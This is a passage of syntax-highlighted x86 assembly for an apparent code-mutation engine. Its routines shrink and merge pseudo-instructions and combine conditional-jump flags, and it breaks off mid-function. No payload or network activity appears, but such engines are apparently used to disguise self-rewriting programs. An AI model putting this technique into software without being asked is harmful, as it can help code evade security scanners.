      </span><span class="sc5">@@Triple_End</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndNoCompressed</span><span class="sc0">  </span><span class="sc1">; If we didn't found any single,</span><span class="sc0">
                                         </span><span class="sc1">; pair or triplet, end with flag of</span><span class="sc0">
      </span><span class="sc5">@@EndCompressed</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; "not found"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@EndNoCompressed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ShrinkThisInstructions</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This routine checks if the pseudoopcode passed uses a memory operand,</span><span class="sc0">
</span><span class="sc1">;; returning EAX = 1 if uses it, or 0 if it doesn't</span><span class="sc0">
</span><span class="sc5">CheckIfInstructionUsesMem</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">  </span><span class="sc1">; Common op?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Common</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">  </span><span class="sc1">; MOV Mem,Mem --&gt; return TRUE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">  </span><span class="sc1">; If 50/51/58/59 --&gt; return bit 0</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@CheckLastBit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">; Common 8 bits operations?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NoMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Common</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E7h</span><span class="sc0"> </span><span class="sc1">; From E0 to E7 (NOT/NEG) -&gt; return bit 0</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@CheckLastBit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0"> </span><span class="sc1">; CALL Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0"> </span><span class="sc1">; JMP Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F1h</span><span class="sc0"> </span><span class="sc1">; SHIFT Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F3h</span><span class="sc0"> </span><span class="sc1">; SHIFT Mem8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0"> </span><span class="sc1">; APICALL_STORE?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0"> </span><span class="sc1">; MOVZX Reg,byte ptr [Mem]?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0"> </span><span class="sc1">; LEA?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
       </span><span class="sc5">@@NoMem</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Return FALSE</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc5">@@CheckLastBit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Return bit 0</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc5">@@Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">  </span><span class="sc1">; Temporal info-transferring opcode</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UsesMem</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NoMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; OP Reg,Mem / OP Mem,Reg / OP Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@NoMem</span><span class="sc0">     </span><span class="sc1">; If not, return FALSE</span><span class="sc0">
       </span><span class="sc5">@@UsesMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckIfInstructionUsesMem</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function merges the Imms passed in ECX and EDX depending on the</span><span class="sc0">
</span><span class="sc1">;; operations passed in EBX and EAX. The return values are the result of</span><span class="sc0">
</span><span class="sc1">;; merging the operations. For example, if we pass MOV EAX,1234 / ADD EAX,5</span><span class="sc0">
</span><span class="sc1">;; then the returned operation will be MOV EAX,1239. It's also made for</span><span class="sc0">
</span><span class="sc1">;; ADD + ADD/SUB and many more. If the operation can't be joined then the</span><span class="sc0">
</span><span class="sc1">;; return value is 0FEh. If there are no merging, but the first instruction</span><span class="sc0">
</span><span class="sc1">;; does nothing (for example, ADD EAX,1234 / MOV EAX,5 --&gt; MOV EAX,5) then</span><span class="sc0">
</span><span class="sc1">;; the return value is NOP.</span><span class="sc0">
</span><span class="sc1">; In:</span><span class="sc0">
</span><span class="sc1">;; ECX = First Imm</span><span class="sc0">
</span><span class="sc1">;; EDX = 2nd Imm</span><span class="sc0">
</span><span class="sc1">;; EAX = First OP</span><span class="sc0">
</span><span class="sc1">;; EBX = 2nd OP (in lower 8 bits)</span><span class="sc0">
</span><span class="sc1">; Out:</span><span class="sc0">
</span><span class="sc1">;; ECX = Value to OP</span><span class="sc0">
</span><span class="sc1">;; EAX = OP to perform</span><span class="sc0">
</span><span class="sc1">;;      FEh if it isn't shrinkable.</span><span class="sc0">
</span><span class="sc1">;;      FFh if we must eliminate 1st instruction and leave 2nd invariable.</span><span class="sc0">
</span><span class="sc5">CalculateOperation</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;; ADC &amp; SBB aren't treated since they aren't used by the engine.</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">; If 2nd instruction is MOV, eliminate 1st</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Eliminate1st</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">; First instruction == MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV</span><span class="sc0">        </span><span class="sc1">; Then, do the merge</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; ADD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ADD</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">; OR?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OR</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">   </span><span class="sc1">; AND?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@AND</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">   </span><span class="sc1">; SUB?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SUB</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">   </span><span class="sc1">; XOR?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@XOR</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">   </span><span class="sc1">; CMP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Eliminate1st</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">   </span><span class="sc1">; TEST</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Eliminate1st</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoCompression</span><span class="sc0">

     </span><span class="sc1">; Check a merging with the ADD as first instruction</span><span class="sc0">
     </span><span class="sc5">@@ADD</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; 2nd instr. ADD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ADD_ADD</span><span class="sc0">   </span><span class="sc1">; Then, merge</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">  </span><span class="sc1">; 2nd instr. SUB?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ADD_SUB</span><span class="sc0">   </span><span class="sc1">; Then, merge</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoCompression</span><span class="sc0">  </span><span class="sc1">; Exit with no compression</span><span class="sc0">

     </span><span class="sc1">; Try the merging with OR</span><span class="sc0">
     </span><span class="sc5">@@OR</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; 2nd instruction == OR?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OR_OR</span><span class="sc0">     </span><span class="sc1">; Merge OR / OR</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoCompression</span><span class="sc0">  </span><span class="sc1">; Exit with no compression</span><span class="sc0">

     </span><span class="sc5">@@AND</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc1">; Check AND / AND</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@AND_AND</span><span class="sc0">   </span><span class="sc1">; If it is, merge ANDs</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoCompression</span><span class="sc0">  </span><span class="sc1">; Exit with no compression</span><span class="sc0">

     </span><span class="sc5">@@SUB</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; Check SUB / ADD or SUB / SUB</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SUB_ADD</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoCompression</span><span class="sc0">  </span><span class="sc1">; Exit with no compression</span><span class="sc0">
     </span><span class="sc5">@@SUB_SUB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; Merge the SUBs into a single operation:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; -(1st) - 2nd = ADD Imm</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@SUB_ADD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; 2nd - 1st = ADD Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@XOR</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">  </span><span class="sc1">; XOR / XOR?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@XOR_XOR</span><span class="sc0">   </span><span class="sc1">; Then merge XORs</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoCompression</span><span class="sc0"> </span><span class="sc1">; If it's not XOR, don't merge</span><span class="sc0">

     </span><span class="sc5">@@MOV</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; MOV / ADD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_ADD</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; MOV / OR?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_OR</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc1">; MOV / AND?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_AND</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">  </span><span class="sc1">; MOV / SUB?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_SUB</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">  </span><span class="sc1">; MOV / XOR?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV_XOR</span><span class="sc0">
     </span><span class="sc5">@@NoCompression</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0"> </span><span class="sc1">; Set "no compression" return value</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Eliminate1st</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; Set NOP to first instruction (and leave the</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">               </span><span class="sc1">; second instruction untouched)</span><span class="sc0">

     </span><span class="sc5">@@ADD_ADD</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">@@MOV_ADD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; MOV + ADD or ADD + ADD = Add both Imms</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@OR_OR</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; MOV + OR or OR + OR = OR both Imms</span><span class="sc0">
     </span><span class="sc5">@@MOV_OR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@AND_AND</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; MOV + AND or AND + AND = AND both Imms</span><span class="sc0">
     </span><span class="sc5">@@MOV_AND</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@ADD_SUB</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; MOV + SUB or ADD + SUB = SUB 2nd Imm from</span><span class="sc0">
     </span><span class="sc5">@@MOV_SUB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; first Imm</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@XOR_XOR</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; MOV + XOR or XOR + XOR = XOR both Imms</span><span class="sc0">
     </span><span class="sc5">@@MOV_XOR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CalculateOperation</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function merges two flag checks (like JNZ/JA, for example) to get a</span><span class="sc0">
</span><span class="sc1">;; direct check to use in a conditional jump.</span><span class="sc0">
</span><span class="sc1">;; In:</span><span class="sc0">
</span><span class="sc1">;;  EAX = Flag to check 1</span><span class="sc0">
</span><span class="sc1">;;  EBX = Flag to check 2</span><span class="sc0">
</span><span class="sc1">;; Out:</span><span class="sc0">
</span><span class="sc1">;;  EAX = Direct flag (+70h = 7xh, opcode of Jcc)</span><span class="sc0">
</span><span class="sc1">;;      = 79h if unconditional jump is performed (+70h = E9h, opcode of JMP)</span><span class="sc0">
</span><span class="sc1">;;      = 0FFh if no direct flag can be used</span><span class="sc0">
</span><span class="sc1">;; This function only tests the flags that are coded by this engine (not all</span><span class="sc0">
</span><span class="sc1">;; the possible types).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Checks can be merged as:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; X(even) + X+1 = JMP(unconditional)</span><span class="sc0">
</span><span class="sc1">;; NB(3) + E(4) = NB(3)</span><span class="sc0">
</span><span class="sc1">;; NB(3) + A(7) = NB(3)</span><span class="sc0">
</span><span class="sc1">;; E(4) + A(7) = NB(3)</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; B(2) + A(7) = NE(5)</span><span class="sc0">
</span><span class="sc1">;; B(2) + NE(5) = NE (5)</span><span class="sc0">
</span><span class="sc1">;; NE(5) + A(7) = NE(5)</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; B(2) + E(4) = BE(6)</span><span class="sc0">
</span><span class="sc1">;; B(2) + BE(6) = BE(6)</span><span class="sc0">
</span><span class="sc1">;; E(4) + BE(6) = BE(6)</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; NB(3) + BE(6) = JMP(unconditional)</span><span class="sc0">
</span><span class="sc1">;; NE(5) + BE(6) = JMP (unconditional)</span><span class="sc0">


</span><span class="sc5">GetRealCheck</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@2</span><span class="sc0">
        </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; ECX &lt;= EDX</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoUnconditional</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; If Jcc1 == 7x and Jcc2 == 7x+1, it's an</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; unconditional JMP (for example,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UnconditionalJump</span><span class="sc0"> </span><span class="sc1">; opcodes 74h/75h (JZ/JNZ), etc.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">@@NoUnconditional</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; If Jcc1 == Jcc2, the result is the same Jcc</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnCurrent</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">; JB?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check2_x</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">; JAE?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check3_x</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; JZ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check4_x</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">    </span><span class="sc1">; JNZ?</span><span class="sc0">
